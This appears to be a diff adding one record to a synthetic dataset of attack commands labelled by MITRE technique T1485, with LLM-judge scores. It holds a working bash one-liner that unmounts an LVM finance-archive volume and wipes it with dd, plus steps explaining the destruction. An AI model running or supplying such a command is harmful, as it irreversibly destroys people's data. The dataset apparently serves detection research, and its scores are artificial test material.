@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'lv=/dev/vg_finance/lv_archive; umount \"$lv\" 2>/dev/null || true; dd if=/dev/zero of=\"$lv\" bs=4M oflag=direct status=progress'",
+  "explanation": "Targets a specific LVM logical volume and overwrites it with zeros, destroying all contained data.",
+  "rationale_steps": [
+    "Select the dedicated logical volume",
+    "Unmount to avoid active filesystem writes",
+    "Overwrite the entire volume with zeros",
+    "Bypass cache to ensure on-disk destruction"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-b05d0366",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash -c string with balanced quotes, proper separators, and valid dd and umount options.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly targets an LVM LV and overwrites it with zeros for data destruction, but without elevated privileges the unmount and block device write will fail, making the action unlikely to succeed as stated.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:02:44.298984Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignment, valid use of command substitution, correct semicolons as separators, and valid dd flags (bs=4M, oflag=direct, status=progress).",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by unmounting a specific LVM logical volume and overwriting it entirely with zeros using dd, which irreversibly destroys all data on the volume in a manner consistent with targeted data destruction against financial archive storage.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-19T01:42:46.582569Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper Bash syntax, including variable assignment, error redirection, logical operators, and standard dd flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively achieves data destruction by unmounting the volume and overwriting the raw block device with zeros, which is a classic implementation of T1485.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:42:48.791787Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
